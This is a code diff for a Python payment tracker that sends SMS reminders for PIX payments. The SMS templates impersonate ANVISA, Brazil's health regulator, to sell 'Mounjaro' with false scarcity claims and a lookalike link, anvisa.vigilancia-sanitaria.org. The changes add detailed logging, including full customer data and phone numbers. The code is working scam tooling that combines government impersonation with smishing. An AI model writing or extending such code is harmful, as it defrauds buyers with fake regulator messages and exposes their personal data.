@@ -35,6 +35,7 @@ def register_payment(transaction_id, customer_data):
         'customer_data': customer_data
     }
     logger.info(f"[PAYMENT_TRACKER] New payment registered: {transaction_id}")
+    logger.info(f"[PAYMENT_TRACKER] Customer data: {customer_data}")
     
     # Send initial SMS for new payment generation
     send_initial_payment_sms(transaction_id, customer_data)
@@ -73,19 +74,28 @@ def send_initial_payment_sms(transaction_id, customer_data):
         # Message template for new PIX generation
         message = f"ANVISA INFORMA: Seu Pedido MOUNJARO (1 CAIXA COM 4 UNIDADES) foi gerado com sucesso. Finalize o pagamento do QRcode PIX e confirme a sua compra antes que expire"
         
+        logger.info(f"[PAYMENT_TRACKER] Sending initial SMS to {phone_number} for transaction {transaction_id}")
+        
+        # Prepare request data
+        request_data = {
+            'phone': phone_number,
+            'message': message
+        }
+        logger.info(f"[PAYMENT_TRACKER] SMS request data: {request_data}")
+        
         # Send SMS via the API
         response = requests.post(
             MANUAL_NOTIFICATION_API,
-            json={
-                'phone': phone_number,
-                'message': message
-            }
+            json=request_data
         )
         
+        logger.info(f"[PAYMENT_TRACKER] SMS API response status: {response.status_code}")
+        
         if response.status_code == 200:
-            logger.info(f"[PAYMENT_TRACKER] Initial payment SMS sent successfully for {transaction_id}")
+            response_data = response.json()
+            logger.info(f"[PAYMENT_TRACKER] Initial payment SMS sent successfully for {transaction_id}. Response: {response_data}")
         else:
-            logger.error(f"[PAYMENT_TRACKER] Failed to send initial SMS for {transaction_id}. Status: {response.status_code}")
+            logger.error(f"[PAYMENT_TRACKER] Failed to send initial SMS for {transaction_id}. Status: {response.status_code}, Response: {response.text}")
             
     except Exception as e:
         logger.error(f"[PAYMENT_TRACKER] Error sending initial SMS for {transaction_id}: {str(e)}")
@@ -113,22 +123,32 @@ def send_reminder_sms(transaction_id, customer_data):
         # Message template for reminder with customer's first name and transaction ID
         message = f"ANVISA: {first_name}, seu PIX para o Mounjaro esta pronto! Ultimas 200 unidades, reserva expira em pouco tempo. Pague agora: https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
         
+        logger.info(f"[PAYMENT_TRACKER] Sending reminder SMS to {phone_number} for transaction {transaction_id}")
+        
+        # Prepare request data
+        request_data = {
+            'phone': phone_number,
+            'message': message
+        }
+        logger.info(f"[PAYMENT_TRACKER] Reminder SMS request data: {request_data}")
+        
         # Send SMS via the API
         response = requests.post(
             MANUAL_NOTIFICATION_API,
-            json={
-                'phone': phone_number,
-                'message': message
-            }
+            json=request_data
         )
         
+        logger.info(f"[PAYMENT_TRACKER] Reminder SMS API response status: {response.status_code}")
+        
         if response.status_code == 200:
-            logger.info(f"[PAYMENT_TRACKER] Reminder SMS sent successfully for {transaction_id}")
+            response_data = response.json()
+            logger.info(f"[PAYMENT_TRACKER] Reminder SMS sent successfully for {transaction_id}. Response: {response_data}")
             # Mark reminder as sent
             if transaction_id in pending_payments:
                 pending_payments[transaction_id]['sent_reminder'] = True
+                logger.info(f"[PAYMENT_TRACKER] Marked transaction {transaction_id} as having received reminder")
         else:
-            logger.error(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}. Status: {response.status_code}")
+            logger.error(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}. Status: {response.status_code}, Response: {response.text}")
             
     except Exception as e:
         logger.error(f"[PAYMENT_TRACKER] Error sending reminder SMS for {transaction_id}: {str(e)}")
@@ -139,6 +159,16 @@ def check_pending_payments():
     """
     now = datetime.utcnow()
     reminder_threshold = timedelta(minutes=10)
+    
+    # Log the current state of pending payments
+    num_pending = len(pending_payments)
+    if num_pending > 0:
+        logger.info(f"[PAYMENT_TRACKER] Checking {num_pending} pending payments")
+        for transaction_id, data in pending_payments.items():
+            time_elapsed = now - data['created_at']
+            minutes_elapsed = time_elapsed.total_seconds() / 60
+            reminder_sent = data['sent_reminder']
+            logger.info(f"[PAYMENT_TRACKER] Transaction {transaction_id} pending for {minutes_elapsed:.1f} minutes, reminder sent: {reminder_sent}")
     
     for transaction_id, data in list(pending_payments.items()):
         # Skip payments that already have reminders sent
